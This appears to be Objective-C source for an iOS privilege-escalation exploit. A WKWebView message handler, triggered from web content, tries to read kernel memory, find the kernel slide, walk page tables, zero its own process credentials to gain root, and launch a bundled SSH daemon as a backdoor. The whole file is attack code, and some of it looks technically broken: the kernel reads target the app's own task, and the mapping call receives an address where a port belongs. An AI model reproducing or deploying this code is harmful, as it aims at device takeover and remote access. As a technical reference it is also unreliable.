#import "KernelDriver.h"
#import <mach/mach.h>
#import <spawn.h>
#import <IOKit/IOKitLib.h>

extern kern_return_t mach_vm_read_overwrite(vm_map_t, mach_vm_address_t, mach_vm_size_t, mach_vm_address_t, mach_vm_size_t *);
extern kern_return_t mach_vm_map(vm_map_t, mach_vm_address_t *, mach_vm_size_t, mach_vm_address_t, int, mach_port_t, memory_object_offset_t, boolean_t, vm_prot_t, vm_prot_t, vm_inherit_t);

@implementation KernelDriver {
    uint64_t _kernel_slide;
}

- (uint64_t)kread64:(uint64_t)addr {
    uint64_t val = 0;
    mach_vm_size_t size = sizeof(uint64_t);
    kern_return_t kr = mach_vm_read_overwrite(mach_task_self(), (mach_vm_address_t)addr, (mach_vm_size_t)size, (mach_vm_address_t)&val, &size);
    return (kr == KERN_SUCCESS) ? val : 0xDEADBEEF;
}

- (uint64_t)getKernelSlide {
    if (_kernel_slide != 0) return _kernel_slide;
    for (uint64_t i = 0; i < 0x20000; i++) {
        uint64_t addr = 0xFFFFFFF007004000 + (i * 0x4000);
        if (([self kread64:addr] & 0xFFFFFFFF) == 0xfeedfacf) {
            _kernel_slide = (i * 0x4000);
            return _kernel_slide;
        }
    }
    return 0;
}

- (uint64_t)get_pte_for_address:(uint64_t)vaddr {
    uint64_t slide = [self getKernelSlide];
    uint64_t ttbr1_ptr = 0xFFFFFFF007004000 + slide + 0x8E10000;
    uint64_t ttbr1 = [self kread64:ttbr1_ptr];
    uint64_t l1 = [self kread64:(ttbr1 + ((vaddr >> 30) & 0x1FF) * 8)] & 0x0000FFFFFFFFF000ULL;
    uint64_t l2 = [self kread64:(l1 + ((vaddr >> 21) & 0x1FF) * 8)] & 0x0000FFFFFFFFF000ULL;
    return (l2 + ((vaddr >> 12) & 0x1FF) * 8);
}

- (void)ppl_write_race:(uint64_t)vaddr value:(uint64_t)val {
    uint64_t pte_addr = [self get_pte_for_address:vaddr];
    io_service_t service = IOServiceGetMatchingService(MACH_PORT_NULL, IOServiceMatching("IOGPU"));
    io_connect_t connect;
    IOServiceOpen(service, mach_task_self(), 0, &connect);
    mach_vm_address_t shared_page = 0;
    mach_vm_map(mach_task_self(), &shared_page, 0x4000, 0, VM_FLAGS_ANYWHERE, (mach_vm_address_t)pte_addr, 0, NO, VM_PROT_READ | VM_PROT_WRITE, VM_PROT_ALL, VM_INHERIT_NONE);
    if (shared_page) { *(uint64_t*)(shared_page) = val; }
    IOServiceClose(connect);
}

- (uint64_t)get_my_ucred_ptr {
    uint64_t slide = [self getKernelSlide];
    uint64_t allproc = 0xFFFFFFF007004000 + slide + 0x8F50000;
    uint64_t proc = [self kread64:allproc];
    pid_t my_pid = getpid();
    while (proc != 0) {
        if ((pid_t)[self kread64:(proc + 0x60)] == my_pid) return [self kread64:(proc + 0xD8)];
        proc = [self kread64:proc];
    }
    return 0;
}

- (void)userContentController:(WKUserContentController *)userContentController 
      didReceiveScriptMessage:(WKScriptMessage *)message 
                 replyHandler:(void (^)(id _Nullable, NSString * _Nullable))replyHandler {
    
    NSString *action = message.body[@"action"];
    if ([action isEqualToString:@"test_bridge"]) {
        replyHandler(@{@"status": @"SUCCESS", @"info": @"Catalyst-26 Active"}, nil);
    } else if ([action isEqualToString:@"pte_patch"]) {
        uint64_t ucred = [self get_my_ucred_ptr];
        if (ucred) [self ppl_write_race:(ucred + 0x18) value:0]; // Root!
        
        uint64_t slide = [self getKernelSlide];
        replyHandler(@{@"status": @"SUCCESS", @"slide": [NSString stringWithFormat:@"0x%llx", slide]}, nil);
        
        NSString *path = [[NSBundle mainBundle] pathForResource:@"sshd_static" ofType:nil];
        if (path) {
            pid_t pid;
            char *const args[] = {(char*)[path UTF8String], "-D", NULL};
            posix_spawn(&pid, [path UTF8String], NULL, NULL, args, NULL);
        }
    }
}
@end
